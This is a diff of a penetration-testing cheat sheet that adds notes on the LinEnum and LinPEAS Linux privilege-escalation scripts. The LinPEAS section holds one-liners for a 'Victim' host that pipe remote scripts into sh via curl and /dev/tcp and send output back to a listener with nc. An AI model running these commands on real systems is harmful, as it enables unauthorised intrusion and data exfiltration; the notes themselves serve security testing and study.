@@ -60,13 +60,21 @@ Options:
   - `-p` password
   - `-P` password list
 
-# LinEnum
+# LinEnum – Linux Enumeration Script
+This is an awesome Linux enumeration script. It’s run on the target host and searches for many of the common privilege escalation methods or misconfigurations.
 
-Used for privilege escalation
+Some of the enumeration information collected includes:
 
-https://delinea.com/blog/linux-privilege-escalation
-https://null-byte.wonderhowto.com/how-to/use-linenum-identify-potential-privilege-escalation-vectors-0197225/
+Kernel and distribution release details
 
+- System information
+- User information
+- Privileged access
+- Environmental information
+
+https://github.com/rebootuser/LinEnum
+
+## Usage
 Download LinEnum
 
     wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
@@ -103,6 +111,38 @@ Set the execution rights
 Start the script
 
     ./LinEnum.sh
+
+# LinPEAS - Linux Privilege Escalation Awesome Script
+LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on book.hacktricks.xyz.
+
+Check the Local Linux Privilege Escalation checklist from book.hacktricks.xyz.
+
+## Quick Start
+Find the latest versions of all the scripts and binaries in the releases page.
+
+    # From github
+    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+    # Local network
+    sudo python -m SimpleHTTPServer 80 #Host
+    curl 10.10.10.10/linpeas.sh | sh #Victim
+    
+    # Without curl
+    sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+    cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+    
+    # Excute from memory and send output back to the host
+    nc -lvnp 9002 | tee linpeas.out #Host
+    curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
+
+    # Output to file
+    ./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
+    less -r /dev/shm/linpeas.txt #Read with colors
+
+    # Use a linpeas binary
+    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+    chmod +x linpeas_linux_amd64
+    ./linpeas_linux_amd64
 
 # nikto
 Gives vulnerabilities
